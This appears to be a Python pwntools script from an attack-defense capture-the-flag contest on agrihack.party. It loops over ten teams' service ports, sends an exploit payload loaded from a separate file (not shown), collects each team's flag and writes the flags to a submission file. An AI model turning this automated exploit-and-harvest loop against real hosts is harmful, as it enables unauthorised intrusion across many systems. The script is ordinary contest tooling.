from pwn import *
def get_payload():
    payload = open("solusi_6","r").read()
    return payload

def get_flag(host,port):
    conn = remote(host,port)
    conn.recvuntil("6+5=")
    conn.sendline(get_payload())
    flag = conn.recvuntil("}")
    conn.close()
    return flag
    
    
def loop_through():
    flags = []
    for team in range(1,11):
        # ganti disiniii
        if team >9:
            team_str = str(team)
        else:
            team_str = '0'+str(team)
        port = int("3"+team_str+"06")
        flag = get_flag("agrihack.party",port)
        flags.append(flag.strip())
    return flags

    

def start():
    flags = loop_through()
    count = 1
    file_out = open('out','w')
    for flag in flags:
        file_out.write(flag + ',' +str(count)+',6\n')
        count+=1
    
    
        
start()
